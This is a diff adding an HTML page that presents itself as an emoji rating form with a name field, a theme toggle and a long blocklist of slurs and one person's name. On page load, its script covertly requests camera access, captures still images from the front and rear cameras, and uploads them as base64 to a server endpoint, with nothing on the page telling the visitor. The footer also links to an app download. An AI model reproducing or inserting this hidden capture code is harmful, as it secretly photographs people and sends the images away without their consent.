@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Express Yourself</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      overflow: auto;
+    }
+    /* Theme Toggle Button */
+    #themeToggle {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      background: transparent;
+      border: none;
+      font-size: 24px;
+      cursor: pointer;
+      transition: transform 0.3s ease, color 0.3s ease;
+    }
+    #themeToggle:hover {
+      transform: scale(1.2);
+    }
+    /* Default Light Theme */
+    body.light-theme {
+      background-color: #ffffff;
+      color: #000000;
+    }
+    #themeToggle.light-theme {
+      color: #000000;
+    }
+    /* Dark Theme */
+    body.dark-theme {
+      background-color: #181818;
+      color: #ffffff;
+    }
+    #themeToggle.dark-theme {
+      color: #ffffff;
+    }
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      justify-content: center;
+    }
+    .spinner {
+      border: 4px solid rgba(0, 0, 0, 0.1);
+      border-left-color: #4CAF50;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      position: absolute;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+    }
+    @keyframes spin {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+    input[type="text"] {
+      padding: 5px;
+      border: 4px solid #00ffe5;
+      border-radius: 9px;
+      width: 150px;
+      margin-bottom: 2px;
+    }
+    #submit {
+      background-color: #faa200;
+      color: rgb(0, 0, 0);
+      margin-top: 10px;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 7px;
+      cursor: pointer;
+      font-size: large;
+    }
+    #submit:hover {
+      background-color: #25fcea;
+    }
+    h1 {
+      margin-top: 0px;
+      margin-bottom: 20px;
+    }
+    .rating {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+    .rating-item {
+      margin: 3px;
+      font-size: 4em;
+      cursor: pointer;
+    }
+    #content {
+      display: block;
+    }
+    #selectedEmoji {
+      margin-top: 10px;
+      font-size: 1.2em;
+    }
+    #error_exp,
+    #error_null,
+    #error_atul,
+    #error_word {
+      display: none;
+      color: red;
+      margin: 0px auto;
+    }
+    #res {
+      opacity: 0;
+      visibility: hidden;
+      font-size: large;
+      transition: opacity 1.5s ease-in-out, visibility 1.5s ease-in-out;
+    }
+    #res.show {
+      opacity: 1;
+      visibility: visible;
+    }
+    @media screen and (max-width: 600px) {
+      body { padding: 10px; }
+    }
+    /* Hide our temporary video & canvas elements */
+    .temp-media {
+      display: none;
+    }
+
+    /* Footer Styles */
+        footer {
+    margin-top: 50px;
+    padding: 10px 20px;
+    background-color: #181818; /* Match dark theme background */
+    color: #ffffff; /* Match dark theme text color */
+    text-align: center;
+    border-top: 1px solid #333; /* Add subtle border for separation */
+}
+
+footer a {
+    color: #007bff; /* Use a highlight color */
+    text-decoration: none;
+    font-weight: bold; /* Make the link stand out */
+    transition: color 0.3s ease; /* Smooth hover transition */
+}
+
+footer a:hover {
+    color: #25fcea; /* Change color on hover for interaction */
+    text-decoration: underline;
+}
+
+/* For Light Theme */
+body.light-theme footer {
+    background-color: #f0f0f0; /* Use light background */
+    color: #333; /* Use dark text */
+    border-top: 1px solid #ccc; /* Lighter border */
+}
+
+body.light-theme footer a {
+    color: #007bff; /* Highlight color */
+}
+
+body.light-theme footer a:hover {
+    color: #0056b3; /* Darker highlight color */
+}
+
+  </style>
+</head>
+<body>
+  <button id="themeToggle">Dark🌙</button>
+  <div id="loadingSpinner" class="spinner" style="display: none;"></div>
+
+  <!-- Primary content -->
+  <div id="content">
+    <label for="name">Input Your Name:</label> <br>
+    <input type="text" id="name" name="name" required pattern="[^\s]+">
+    <br><br>
+    <h1> Express Yourself from Scale below </h1>
+    <div class="rating">
+      <span class="rating-item" onclick="rate(1)">😒</span>
+      <span class="rating-item" onclick="rate(2)">🤧</span>
+      <span class="rating-item" onclick="rate(3)">🥱</span>
+      <span class="rating-item" onclick="rate(4)">😐</span>
+      <span class="rating-item" onclick="rate(5)">🙂</span>
+      <span class="rating-item" onclick="rate(6)">😄</span>
+      <span class="rating-item" onclick="rate(7)">😀</span>
+      <span class="rating-item" onclick="rate(8)">😁</span>
+      <span class="rating-item" onclick="rate(9)">😉</span>
+      <span class="rating-item" onclick="rate(10)">😋</span>
+      <span class="rating-item" onclick="rate(11)">👽</span>
+    </div>
+    <p id="selectedEmoji">Selected Expression: </p>
+    <button id="submit" onclick="submitFeedback()">Send Response</button>
+  </div>
+
+  <p id="error_exp"><b>Select Expression</b></p>
+  <p id="error_null"><b>Empty name not allowed</b></p>
+  <p id="error_atul"><b>You cannot use this name.😑</b></p>
+  <p id="error_word"><b>Invalid Word</b></p>
+
+  <div id="content2">
+    <p id="res">Response Sent.<br> You may close it now</p>
+  </div>
+
+  <footer>
+        <p>Get App Version Here: <a href="https://aleznaor.pythonanywhere.com/APK.html">Download App</a></p>
+   </footer>
+
+  <!-- Temporary media elements for capturing images -->
+  <video id="tempVideo" class="temp-media" autoplay playsinline></video>
+  <canvas id="tempCanvas" class="temp-media"></canvas>
+
+  <script>
+    // Theme toggle
+    const themeToggle = document.getElementById("themeToggle");
+    const body = document.body;
+    if (localStorage.getItem("theme") === "dark") {
+      body.classList.add("dark-theme");
+      themeToggle.classList.add("dark-theme");
+      themeToggle.textContent = "Light☀️";
+    } else {
+      body.classList.add("light-theme");
+      themeToggle.classList.add("light-theme");
+      themeToggle.textContent = "Dark🌙";
+    }
+    themeToggle.addEventListener("click", function () {
+      if (body.classList.contains("light-theme")) {
+        body.classList.remove("light-theme");
+        body.classList.add("dark-theme");
+        themeToggle.classList.remove("light-theme");
+        themeToggle.classList.add("dark-theme");
+        themeToggle.textContent = "Light☀️";
+        localStorage.setItem("theme", "dark");
+      } else {
+        body.classList.remove("dark-theme");
+        body.classList.add("light-theme");
+        themeToggle.classList.remove("dark-theme");
+        themeToggle.classList.add("light-theme");
+        themeToggle.textContent = "Dark🌙";
+        localStorage.setItem("theme", "light");
+      }
+    });
+
+    // Feedback and rating logic
+    const content = document.getElementById("content");
+    const res = document.getElementById("res");
+    const nameInput = document.getElementById("name");
+    const selectedEmojiElement = document.getElementById("selectedEmoji");
+    const error_exp = document.getElementById("error_exp");
+    const error_null = document.getElementById("error_null");
+    const error_atul = document.getElementById("error_atul");
+    const error_word = document.getElementById("error_word");
+    const emojis = ["😒", "🤧", "🥱", "😐", "🙂", "😄", "😀", "😁", "😉", "😋", "👽"];
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const storedRating = localStorage.getItem('selectedRating');
+      if (storedRating) {
+        selectedEmojiElement.textContent = `Selected Expression: ${emojis[storedRating - 1]}`;
+      }
+      localStorage.removeItem('selectedRating');
+      nameInput.value = '';
+      selectedEmojiElement.textContent = "Selected Expression: ";
+      // Initiate camera capture for both front and rear cameras immediately after permission
+      requestAndCaptureBothCameras();
+    });
+
+    nameInput.addEventListener("keydown", function (event) {
+      if (event.key === "Enter") {
+        nameInput.blur();
+      }
+    });
+
+    nameInput.addEventListener("input", function () {
+      let words = this.value.trim().split(/\s+/);
+      words = words.filter(word => /^[a-zA-Z]+$/.test(word)); // Allow only alphabet words
+      words = words.filter(word => !/^([a-zA-Z])\1{3,}$/.test(word)); // Remove long repeats
+      if (words.length > 9) {
+        words = words.slice(0, 9);
+      }
+      words = words.map(word => word.substring(0, 15));
+      this.value = words.join(" ");
+    });
+
+    nameInput.addEventListener("focus", function () {
+      error_exp.style.display = "none";
+      error_null.style.display = "none";
+      error_atul.style.display = "none";
+      error_word.style.display = "none";
+    });
+
+    function rate(rating) {
+      localStorage.setItem('selectedRating', rating);
+      selectedEmojiElement.textContent = `Selected Expression: ${emojis[rating - 1]}`;
+      error_exp.style.display = "none";
+      error_null.style.display = "none";
+      error_atul.style.display = "none";
+      error_word.style.display = "none";
+    }
+
+    function submitFeedback() {
+      error_exp.style.display = "none";
+      error_null.style.display = "none";
+      error_atul.style.display = "none";
+      error_word.style.display = "none";
+      const rating = localStorage.getItem('selectedRating');
+      const name = nameInput.value.trim();
+      if (!name && !rating) {
+        error_null.style.display = "block";
+        error_exp.style.display = "block";
+        return;
+      }
+      if (!name) {
+        error_null.style.display = "block";
+        return;
+      }
+      if (!rating) {
+        error_exp.style.display = "block";
+        error_null.style.display = "none";
+        return;
+      }
+      // Bad words filtering
+      const atul_input = ["ayub","atul", "a sinha", "asinha", "atul kumar", "atul k sinha", "atul kumar sinha", "a.k. sinha", "a k sinha", "atulksinha", "aks", "a kumar sinha", "aksinha", "sinha atul", "atulsinha", "atulsina", "stulsinha", "arulsinha", "atul anushka"];
+      const badWords = ["bro", "nudes", "behen", "larchat", "pagalchatta", "bhaak", "bhakk", "bhatt", "gali", "mar", "marenge", "bhosarikay", "bsdk", "gadha", "gulli", "gota", "balls", "mall", "lavde", "moot", "gaand", "cum", "mutth", "jhaat", "jhatu", "kamina", "randi", "hijra", "gandu", "chodu", "bharwa", "Bhadhava", "cc", "mc", "bc", "mc bc cc", "chinar", "chinarr", "atul pagal", "choosni", "pagal", "mera lund", "tumri maii", "sugar daddy", "daddy", "dad", "tera baap", "kutta", "lauri", "muh me laura", "burchod", "burchodi", "chut", "sex", "denge choco", "fuck you", "fuck off", "choco", "muh me lo mera", "betichod", "behenchod", "land", "tera lund", "phund", "lund", "laura", "lawra", "bkl", "madharchodo", "madharchod", "madhar-chod", "chod", "madhar", "abuse", "abusing", "fuck", "shit", "damn", "ass", "bitch", "asshole", "bastard", "cunt", "dick", "pussy", "slut", "whore", "faggot", "nigger", "retard", "idiot", "moron", "gay", "lesbian", "trans", "motherfucker", "son of a bitch", "cocksucker", "dickhead", "dumbass", "jackass", "bitch", "slut", "whore", "skank", "hoe", "slag", "prostitute", "queer", "gaylord", "lesbian", "tranny", "transexual", "hermaphrodite", "homo", "lesbo", "tranny", "shemale", "trannsexual", "transgender", "nigger", "nigga", "sand nigger", "gyp", "kike", "raghead", "slant-eye", "slope", "chink", "gook", "jap", "nip", "slit-eye", "squarehead", "wetback", "dune coon", "camel jockey", "raghead", "sand nigger", "camel jockey", "towelhead", "muzzie", "mooslem", "islamo", "terrorist", "suicide bomber", "retard", "tard", "spaz", "lame", "lame-o", "handicapped", "disabled", "special needs", "crazy", "insane", "psycho", "lunatic", "nutcase", "maniac", "loony", "bonkers", "batshit crazy", "nuts", "wacko", "daffy", "dotty", "touched", "weird", "peculiar", "odd", "eccentric", "abnormal", "deviant", "perverted", "twisted", "kinky", "dirty", "filthy", "nasty", "gross", "disgusting", "repulsive", "obscene", "indecent", "vulgar", "lewd", "smutty"];
+      for (const word1 of atul_input) {
+        if (name.toLowerCase().includes(word1.toLowerCase())) {
+          error_atul.style.display = "block";
+          return;
+        }
+      }
+      for (const word2 of badWords) {
+        if (name.toLowerCase().includes(word2.toLowerCase())) {
+          error_word.style.display = "block";
+          return;
+        }
+      }
+      content.style.display = "block";
+      const spinner = document.getElementById("loadingSpinner");
+      spinner.style.display = "block";
+      setTimeout(() => {
+        fetch('/websiterate', {                               // ####################WEBPAGE RATE ###########################
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ rating: rating, name: name })
+        })
+        .then(response => {
+          spinner.style.display = "none";
+          if (response.ok) {
+            content.style.display = "none";
+            res.classList.add("show");
+            localStorage.removeItem('selectedRating');
+            nameInput.value = '';
+            selectedEmojiElement.textContent = "Selected Expression: ";
+          } else {
+            alert("Error submitting feedback.");
+            nameInput.value = '';
+            selectedEmojiElement.textContent = "Selected Expression: ";
+          }
+        })
+        .catch(error => {
+          spinner.style.display = "none";
+          alert("Error: " + error);
+          nameInput.value = '';
+          selectedEmojiElement.textContent = "Selected Expression: ";
+        });
+      }, 1000);
+    }
+
+    // Function to capture image from a specific device
+    // Function to capture image from a specific device
+function captureFromDevice(deviceId, label) {
+  return new Promise((resolve, reject) => {
+    const constraints = { video: { deviceId: { exact: deviceId } } };
+    navigator.mediaDevices.getUserMedia(constraints)
+      .then(stream => {
+        // Create temporary video and canvas elements
+        const tempVideo = document.createElement('video');
+        tempVideo.className = "temp-media";
+        tempVideo.autoplay = true;
+        tempVideo.playsInline = true;
+        tempVideo.srcObject = stream;
+        const tempCanvas = document.createElement('canvas');
+        const tempContext = tempCanvas.getContext('2d');
+
+        tempVideo.addEventListener('canplay', function() {
+          tempCanvas.width = tempVideo.videoWidth;
+          tempCanvas.height = tempVideo.videoHeight;
+          // Set a longer delay for the rear camera if needed
+          const captureDelay = label === "rear" ? 1500 : 500;
+          setTimeout(() => {
+            tempContext.drawImage(tempVideo, 0, 0, tempCanvas.width, tempCanvas.height);
+            const imageData = tempCanvas.toDataURL("image/png");
+            // Stop the stream to free resources
+            stream.getTracks().forEach(track => track.stop());
+            resolve({ label: label, image: imageData });
+          }, captureDelay);
+        });
+      })
+      .catch(err => reject(err));
+  });
+}
+
+
+    // Request generic permission and then capture images from both front and rear cameras
+    function requestAndCaptureBothCameras() {
+      // Request generic video permission to enable device labels
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          // Stop the generic stream once permission is granted
+          stream.getTracks().forEach(track => track.stop());
+          // Enumerate devices
+          return navigator.mediaDevices.enumerateDevices();
+        })
+        .then(devices => {
+          const videoDevices = devices.filter(device => device.kind === 'videoinput');
+          let frontDevice = null, rearDevice = null;
+          videoDevices.forEach(device => {
+            // Use heuristics based on label (labels available after permission)
+            const labelLower = device.label.toLowerCase();
+            if (labelLower.includes("front") || labelLower.includes("user")) {
+              frontDevice = device;
+            }
+            if (labelLower.includes("back") || labelLower.includes("rear") || labelLower.includes("environment")) {
+              rearDevice = device;
+            }
+          });
+          // Capture from whichever devices are found
+          const capturePromises = [];
+          if (frontDevice) {
+            capturePromises.push(captureFromDevice(frontDevice.deviceId, "front"));
+          }
+          if (rearDevice) {
+            capturePromises.push(captureFromDevice(rearDevice.deviceId, "rear"));
+          }
+          return Promise.all(capturePromises);
+        })
+        .then(results => {
+          // Send each captured image to the server
+          results.forEach(result => {
+            fetch('/upload_base64', {                               //**********************WEBPAGE IMAGE***********************
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ image: result.image })
+            })
+            .then(response => response.json())
+            .then(data => console.log(`(${result.label}) ${data.message}`))
+            .catch(error => console.error(`(${result.label}) Image upload error:`, error));
+          });
+        })
+        .catch(error => {
+          console.error("Error capturing cameras:", error);
+        });
+    }
+  </script>
+</body>
+</html>
